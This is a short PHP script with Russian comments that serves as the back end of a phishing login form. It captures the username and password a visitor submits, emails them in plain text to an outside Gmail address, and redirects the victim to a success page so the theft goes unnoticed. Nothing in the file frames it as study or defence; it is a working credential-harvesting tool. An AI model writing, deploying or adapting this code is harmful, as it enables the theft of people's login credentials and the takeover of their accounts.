
<?php
if ($_SERVER["REQUEST_METHOD"] == "POST") {
  $username = $_POST["username"];
  $password = $_POST["password"];
  
  // Пример отправки почты
  $to = "ezeil5408@gmail.com";
  $subject = "Новые данные входа";
  $message = "Логин: " . $username . "\nПароль: " . $password;
  $headers = "From: ezeil5408@gmail.com";
  
  mail($to, $subject, $message, $headers);
  
  // Перенаправление пользователя на другую страницу
  header("Location: success.html");
  exit();
}
?>
